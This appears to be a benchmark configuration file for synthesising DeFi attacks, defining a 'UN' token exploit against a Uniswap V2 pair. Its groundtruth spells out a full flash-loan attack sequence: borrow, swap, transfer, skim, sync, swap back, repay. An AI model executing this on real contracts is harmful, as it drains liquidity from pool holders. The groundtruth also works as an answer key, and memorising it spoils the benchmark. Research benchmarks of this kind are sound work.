@@ -1,0 +1,59 @@
+# Information for benchmarks building.
+project_name: "UN"
+
+ctrt_name2cls:
+  - ["busd", "BUSD"]
+  - ["un", "UN"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["busd", ""]
+  - ["un", "new UN()"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions:
+ - "function burn_un_pair(uint256 amount) internal eurus {
+    un.transfer(address(pair), amount);
+    pair.skim(attacker);
+    pair.sync();
+    }"
+
+extra_deployments: 
+  - "un.setSwapPair(address(pair));"
+
+extra_statements: []
+
+attack_goal_str: "busd"
+
+groundtruth:
+  - ["borrow", "busd", "owner", "29100 * 1e18"]
+  - ["swap", "pair", "attacker", "busd", "un", "busd.balanceOf(attacker)", "91480714664455701397200"]
+  - ["burn", "un", "pair", "un.balanceOf(attacker) * 93 /100"]
+  - ["swap", "pair", "attacker", "un", "busd", "un.balanceOf(attacker)", "3 * 1e22"]
+  - ["payback", "busd", "owner", "29100 * 1e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "busd":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "un":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["un", "busd"]
+    support_swaps:
+      "busd": ["un", "busd"]
+      "un": ["un", "busd"]
+    is_oracle: true
+    oracle: "pair"
+
+pattern: "Liquidity Ratio Break"
